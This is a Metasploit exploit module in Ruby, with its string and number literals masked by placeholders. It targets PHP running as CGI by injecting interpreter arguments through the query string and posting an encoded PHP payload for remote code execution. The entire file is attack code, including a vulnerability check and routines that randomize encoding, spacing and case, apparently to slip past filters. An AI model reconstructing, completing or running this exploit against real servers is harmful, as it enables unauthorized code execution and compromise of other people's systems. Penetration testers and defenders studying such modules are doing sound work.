require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> , <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > false , <str> = > { <str> = > true , <str> = > <int> , } , <str> = > <str> , <str> = > <str> , <str> = > ARCH_PHP , <str> = > [ [ <str> , { } ] ] , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ false , <str> ] ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) , OptBool . new ( <str> , [ true , <str> , false ] ) , ] , self . class ) end def check vprint_status ( <str> uri <str> ) response = send_request_raw ( { <str> = > uri } ) if response and response . code == <int> and response . body =~ <str> and not datastore [ <str> ] vprint_error ( <str> ) return Exploit :: CheckCode :: Unknown end response = send_request_raw ( { <str> = > uri + <str> create_arg ( <str> ) <str> } ) if response and response . code == <int> and response . body =~ <str> return Exploit :: CheckCode :: Vulnerable end if datastore [ <str> ] and response and response . code == <int> return Exploit :: CheckCode :: Appears end vprint_error ( <str> ) return Exploit :: CheckCode :: Safe end def uri if datastore [ <str> ] normalize_uri ( <str> , <str> ) else normalize_uri ( target_uri . path ) . gsub ( <str> , <str> ) end end def uri_encoding_level if datastore [ <str> ] return <int> else return datastore [ <str> ] end end def exploit begin args = [ rand_spaces ( ) , create_arg ( <str> , <str> rand_php_ini_true <str> ) , create_arg ( <str> , <str> rand_php_ini_false <str> ) , create_arg ( <str> , <str> rand_php_ini_true <str> ) , create_arg ( <str> , <str> ) , create_arg ( <str> , <str> ) , create_arg ( <str> , <str> ) , rand_opt_equiv ( <str> ) ] qs = args . join ( ) payload_oneline = <str> + payload . encoded . gsub ( <str> , <str> ) . gsub ( <str> , <str> ) response = send_request_cgi ( { <str> = > <str> , <str> = > true , <str> = > <str> uri <str> qs <str> , <str> = > payload_oneline , } , <int> . <int> ) handler rescue :: Interrupt raise $! rescue :: Rex :: HostUnreachable , :: Rex :: ConnectionRefused print_error ( <str> ) rescue :: OpenSSL :: SSL :: SSLError print_error ( <str> ) end end def create_arg ( arg , val = nil ) if val val = rand_encode ( val ) val . gsub! ( <str> , <str> ) val . gsub! ( <str> , <str> ) end ret = <str> ret << <str> rand_spaces <str> ret << <str> rand_opt_equiv ( arg ) <str> ret << <str> rand_space <str> ret << <str> rand_spaces <str> ret << <str> val <str> ret << <str> rand_space <str> end def rand_opt_equiv ( opt ) opt_equivs = { <str> = > [ <str> rand_dash <str> rand_encode ( <str> ) <str> , <str> rand_dash <str> rand_dash <str> rand_encode ( <str> ) <str> ] , <str> = > [ <str> rand_dash <str> rand_encode ( <str> ) <str> , <str> rand_dash <str> rand_dash <str> rand_encode ( <str> ) <str> , <str> rand_dash <str> rand_dash <str> rand_encode ( <str> ) <str> ] , <str> = > [ <str> rand_dash <str> rand_encode ( <str> ) <str> , <str> rand_dash <str> rand_dash <str> rand_encode ( <str> ) <str> ] , <str> = > [ <str> rand_dash <str> rand_encode ( <str> ) <str> , <str> rand_dash <str> rand_dash <str> rand_encode ( <str> ) <str> ] } equivs = opt_equivs [ opt ] equivs ? equivs [ rand ( opt_equivs [ opt ] . length ) ] : opt end def rand_encode ( string , max = string . length ) chars = [ ] ; if max > uri_encoding_level then max = uri_encoding_level end if string . length == <int> if rand ( <int> ) > <int> chars << <int> end else if max > <int> max . times { chars << rand ( string . length ) } end end chars . uniq . sort . reverse . each { | index | string [ index ] = Rex :: Text . uri_encode ( string [ index , <int> ] , <str> ) } string end def rand_spaces ( num = uri_encoding_level ) ret = <str> num . times { ret << rand_space } ret end def rand_space uri_encoding_level > <int> ? [ <str> , <str> , <str> ] [ rand ( <int> ) ] : <str> end def rand_dash uri_encoding_level > <int> ? [ <str> , <str> , <str> ] [ rand ( <int> ) ] : <str> end def rand_php_ini_false Rex :: Text . to_rand_case ( [ <str> , <str> , <str> ] [ rand ( <int> ) ] ) end def rand_php_ini_true Rex :: Text . to_rand_case ( [ <str> , <str> , <str> ] [ rand ( <int> ) ] ) end end 
